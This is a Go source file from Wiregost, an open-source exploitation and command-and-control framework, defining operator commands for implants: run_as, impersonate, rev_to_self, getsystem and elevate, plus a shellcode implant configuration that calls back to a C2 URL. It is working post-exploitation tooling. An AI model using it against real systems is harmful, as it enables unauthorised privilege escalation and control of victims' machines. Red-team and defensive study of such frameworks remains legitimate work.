// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/gogo/protobuf/proto"

	"github.com/maxlandon/wiregost/client/spin"
	clientpb "github.com/maxlandon/wiregost/protobuf/client"
	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
)

func registerPrivCommands() {
	runAs := &Command{
		Name: "run_as",
		Args: []*CommandArg{
			&CommandArg{Name: "proc", Type: "string"},
			&CommandArg{Name: "user", Type: "string"},
			&CommandArg{Name: "timeout", Type: "int"},
		},
		Handle: func(r *Request) error {
			fmt.Println()
			runAs(r.Args, *r.context, r.context.Server.RPC)
			return nil
		},
	}
	AddCommand("agent", runAs)

	impersonate := &Command{
		Name: "impersonate",
		Handle: func(r *Request) error {
			fmt.Println()
			impersonate(r.Args, *r.context, r.context.Server.RPC)
			return nil
		},
	}
	AddCommand("agent", impersonate)

	rev2self := &Command{
		Name: "rev_to_self",
		Handle: func(r *Request) error {
			fmt.Println()
			revToSelf(*r.context, r.context.Server.RPC)
			return nil
		},
	}
	AddCommand("agent", rev2self)

	getsystem := &Command{
		Name: "getsystem",
		Args: []*CommandArg{
			&CommandArg{Name: "proc", Type: "string"},
		},
		Handle: func(r *Request) error {
			fmt.Println()
			getsystem(r.Args, *r.context, r.context.Server.RPC)
			return nil
		},
	}
	AddCommand("agent", getsystem)

	elevate := &Command{
		Name: "elevate",
		Args: []*CommandArg{
			&CommandArg{Name: "proc", Type: "string"},
		},
		Handle: func(r *Request) error {
			fmt.Println()
			elevate(*r.context, r.context.Server.RPC)
			return nil
		},
	}
	AddCommand("agent", elevate)
}

func runAs(args []string, ctx ShellContext, rpc RPCServer) {

	opts := privFilters(args)

	var username string
	user, found := opts["user"]
	if found {
		username = user.(string)
	} else {
		fmt.Printf(Warn + "please specify a username\n")
		return
	}

	var process string
	proc, found := opts["proc"]
	if found {
		process = proc.(string)
	} else {
		fmt.Printf(Warn + "please specify a process path\n")
		return
	}

	var arguments string
	spargs, found := opts["args"]
	if found {
		arguments = spargs.(string)
	}

	runAs, err := runProcessAsUser(username, process, arguments, ctx, rpc)
	if err != nil {
		fmt.Printf(err.Error())
		return
	}
	if runAs.Err != "" {
		fmt.Printf(Warn+"Error: %s\n", runAs.Err)
		return
	}
	fmt.Printf(Success+"Sucessfully ran %s %s on %s\n", process, arguments, ctx.CurrentAgent.Name)
}

func impersonate(args []string, ctx ShellContext, rpc RPCServer) {
	if len(args) != 1 {
		fmt.Printf(Warn + "You must provide a username. See `help impersonate`\n")
		return
	}
	username := args[0]

	data, _ := proto.Marshal(&ghostpb.ImpersonateReq{
		Username: username,
		GhostID:  ctx.CurrentAgent.ID,
	})

	resp := <-rpc(&ghostpb.Envelope{
		Type: ghostpb.MsgImpersonate,
		Data: data,
	}, defaultTimeout)

	if resp.Err != "" {
		fmt.Printf(RPCError+"%s\n", resp.Err)
		return
	}
	impResp := &ghostpb.Impersonate{}
	err := proto.Unmarshal(resp.Data, impResp)
	if err != nil {
		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
	}
	if impResp.Err != "" {
		fmt.Printf(Warn+"Error: %s\n", impResp.Err)
		return
	}
	fmt.Printf(Success+"Successfully impersonated %s\n", username)
}

func revToSelf(ctx ShellContext, rpc RPCServer) {

	data, err := proto.Marshal(&ghostpb.RevToSelfReq{
		GhostID: ctx.CurrentAgent.ID,
	})
	if err != nil {
		fmt.Printf(Warn+"Error marshaling RevToSelfReq: %v\n", err)
		return
	}

	resp := <-rpc(&ghostpb.Envelope{
		Type: ghostpb.MsgRevToSelf,
		Data: data,
	}, defaultTimeout)

	if resp.Err != "" {
		fmt.Printf(RPCError+"%s\n", resp.Err)
		return
	}
	rtsResp := &ghostpb.RevToSelf{}
	err = proto.Unmarshal(resp.Data, rtsResp)
	if err != nil {
		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
	}
	if rtsResp.Err != "" {
		fmt.Printf(Warn+"Error: %s", resp.Err)
		return
	}
	fmt.Printf(Info + "Back to self...\n")
}

func getsystem(args []string, ctx ShellContext, rpc RPCServer) {

	opts := privFilters(args)
	var process string
	proc, found := opts["proc"]
	if found {
		process = proc.(string)
	}

	config := getActiveGhostConfig(ctx)
	ctrl := make(chan bool)
	go spin.Until("Attempting to create a new Ghost implant session as 'NT AUTHORITY\\SYSTEM'...", ctrl)
	data, _ := proto.Marshal(&clientpb.GetSystemReq{
		GhostID:        ctx.CurrentAgent.ID,
		Config:         config,
		HostingProcess: process,
	})
	resp := <-rpc(&ghostpb.Envelope{
		Type: clientpb.MsgGetSystemReq,
		Data: data,
	}, 45*time.Minute)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(RPCError+"%s\n", resp.Err)
		return
	}
	gsResp := &ghostpb.GetSystem{}
	err := proto.Unmarshal(resp.Data, gsResp)
	if err != nil {
		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}
	if gsResp.Output != "" {
		fmt.Printf("\n"+Warn+"Error: %s\n", gsResp.Output)
		return
	}
	fmt.Printf(Info + "A new SYSTEM session should pop soon...\n")
}

func elevate(ctx ShellContext, rpc RPCServer) {

	ctrl := make(chan bool)
	go spin.Until("Starting a new Ghost implant session...", ctrl)
	data, _ := proto.Marshal(&ghostpb.ElevateReq{GhostID: ctx.CurrentAgent.ID})
	resp := <-rpc(&ghostpb.Envelope{
		Type: ghostpb.MsgElevate,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(RPCError+"%s\n", resp.Err)
		return
	}
	elevate := &ghostpb.Elevate{}
	err := proto.Unmarshal(resp.Data, elevate)
	if err != nil {
		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}
	if !elevate.Success {
		fmt.Printf(Warn+"Elevation failed: %s\n", elevate.Err)
		return
	}
	fmt.Printf(Success + "Elevation successful, a new Ghost implant session should pop soon.\n")
}

// Utility functions
func runProcessAsUser(username, process, arguments string, ctx ShellContext, rpc RPCServer) (runAs *ghostpb.RunAs, err error) {
	data, _ := proto.Marshal(&ghostpb.RunAsReq{
		Username: username,
		Process:  process,
		Args:     arguments,
		GhostID:  ctx.CurrentAgent.ID,
	})

	resp := <-rpc(&ghostpb.Envelope{
		Type: ghostpb.MsgRunAs,
		Data: data,
	}, defaultTimeout)
	if resp.Err != "" {
		fmt.Printf(RPCError+"%s\n", resp.Err)
		return
	}
	runAs = &ghostpb.RunAs{}
	err = proto.Unmarshal(resp.Data, runAs)
	if err != nil {
		err = fmt.Errorf(Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}
	return
}

func getActiveGhostConfig(ctx ShellContext) *clientpb.GhostConfig {
	ghost := *ctx.CurrentAgent
	c2s := []*clientpb.GhostC2{}
	c2s = append(c2s, &clientpb.GhostC2{
		URL:      ghost.ActiveC2,
		Priority: uint32(0),
	})
	config := &clientpb.GhostConfig{
		GOOS:   ghost.GetOS(),
		GOARCH: ghost.GetArch(),
		Debug:  true,

		MaxConnectionErrors: uint32(1000),
		ReconnectInterval:   uint32(60),

		Format:      clientpb.GhostConfig_SHELLCODE,
		IsSharedLib: true,
		C2:          c2s,
	}
	return config
}

func privFilters(args []string) (opts map[string]interface{}) {
	opts = make(map[string]interface{}, 0)

	for _, arg := range args {

		// User
		if strings.Contains(arg, "user") {
			vals := strings.Split(arg, "=")
			opts["user"] = vals[1]
		}
		// Process
		if strings.Contains(arg, "proc") {
			vals := strings.Split(arg, "=")
			opts["proc"] = vals[1]
		}
		// Timeout
		if strings.Contains(arg, "timeout") {
			vals := strings.Split(arg, "=")
			timeout, _ := strconv.Atoi(vals[1])
			opts["timeout"] = timeout
		}

		// Special Arguments
		if strings.Contains(arg, "args") {
			desc := regexp.MustCompile(`\b(args){1}.*"`)
			result := desc.FindStringSubmatch(strings.Join(args, " "))
			opts["args"] = strings.Trim(strings.TrimPrefix(result[0], "args="), "\"")
		}
	}

	return opts
}
